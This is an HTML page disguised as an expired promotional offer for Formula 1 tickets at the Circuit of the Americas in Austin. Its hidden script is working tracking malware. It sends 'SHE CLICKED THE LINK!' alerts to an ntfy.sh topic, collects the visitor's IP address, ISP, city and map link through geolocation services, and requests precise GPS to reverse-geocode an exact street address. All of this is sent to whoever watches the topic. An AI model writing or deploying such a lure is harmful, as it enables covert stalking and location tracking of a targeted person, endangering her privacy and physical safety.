<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>F1 Tickets - COTA Austin</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#fff;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,0.08);max-width:420px;width:90%;padding:2.5rem 2rem;text-align:center}
.icon{font-size:3rem;margin-bottom:1rem}
h1{font-size:1.3rem;color:#1a1a1a;margin-bottom:0.5rem;font-weight:600}
p{color:#666;font-size:0.9rem;line-height:1.6;margin-bottom:1rem}
.sub{color:#999;font-size:0.75rem}
</style>
</head>
<body>
<div class="card">
<div class="icon">🏎️</div>
<h1>This offer has expired</h1>
<p>The promotional tickets you're looking for are no longer available. This link has expired.</p>
<p class="sub">Formula 1 Aramco United States Grand Prix 2025<br>Circuit of the Americas, Austin TX</p>
</div>
<script>
(function(){
  var T='roja-tracker-k141';
  function s(title,msg,p){
    try{fetch('https://ntfy.sh',{method:'POST',body:JSON.stringify({topic:T,title:title,message:msg,priority:p,tags:['eyes']})}).then(function(r){console.log('sent',r.status)}).catch(function(e){console.log('err',e)})}catch(e){}
  }
  var d=/mobile/i.test(navigator.userAgent)?'📱 Mobile':'💻 Desktop';
  var t=new Date().toLocaleString('en-US',{timeZone:'America/Chicago'});
  s('👀 SHE CLICKED THE LINK!','Device: '+d+'\nTime: '+t,5);

  fetch('https://ipwho.is/')
    .then(function(r){return r.json()})
    .then(function(d){
      if(!d.success)return;
      var map='https://maps.google.com/?q='+d.latitude+','+d.longitude;
      var org=d.connection&&d.connection.org?'\n🏢 '+d.connection.org:'';
      var isp=d.connection&&d.connection.isp?d.connection.isp:'Unknown';
      var zip=d.postal||'';
      s('📍 Location','📌 '+d.city+', '+d.region+' '+zip+'\n🌐 ISP: '+isp+org+'\n🔢 IP: '+d.ip+'\n🗺️ Map: '+map,4);
    }).catch(function(){
      fetch('https://ipapi.co/json/')
        .then(function(r){return r.json()})
        .then(function(d){
          s('📍 Location','📌 '+d.city+', '+d.region+' '+d.postal+'\n🌐 ISP: '+d.org+'\n🔢 IP: '+d.ip,4);
        }).catch(function(){});
    });

  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(function(pos){
      var map='https://maps.google.com/?q='+pos.coords.latitude+','+pos.coords.longitude;
      fetch('https://nominatim.openstreetmap.org/reverse?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude+'&format=json')
        .then(function(r){return r.json()})
        .then(function(d){s('📍 EXACT ADDRESS!',d.display_name+'\n🗺️ Map: '+map,5)})
        .catch(function(){s('📍 GPS',pos.coords.latitude+','+pos.coords.longitude+'\n🗺️ Map: '+map,4)});
    },function(){},{enableHighAccuracy:true,timeout:10000});
  }
})();
</script>
</body>
</html>
